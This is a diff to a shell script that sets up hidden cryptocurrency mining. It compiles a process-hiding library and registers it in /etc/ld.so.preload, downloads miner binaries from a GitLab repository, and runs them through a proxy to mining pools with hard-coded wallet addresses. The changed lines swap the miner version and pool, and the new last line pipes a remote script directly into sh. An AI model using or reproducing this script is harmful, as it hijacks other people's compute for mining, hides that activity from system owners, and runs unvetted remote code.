@@ -13,9 +13,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.81
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.88
 
-chmod 777 lol1.81
+chmod 777 lol1.88
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 -a PYRIN -p 157.245.6.241:80 -u pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 165.227.180.199:443 -u TuskeSyuMmk2xje2yUypZdWqLyjzRG7AjgcGk21HqjPTeztTahdSjA1SL7qokYAJxJ2NESFcGy5oQEdtNXMqjFGp5a7RE7cVrLa3LS -p WK01 -k -a rx/tuske -t40 --pass m=solo
+./graftcp/graftcp ./lol1.88 -a TON --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x --ton-mode 6 & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
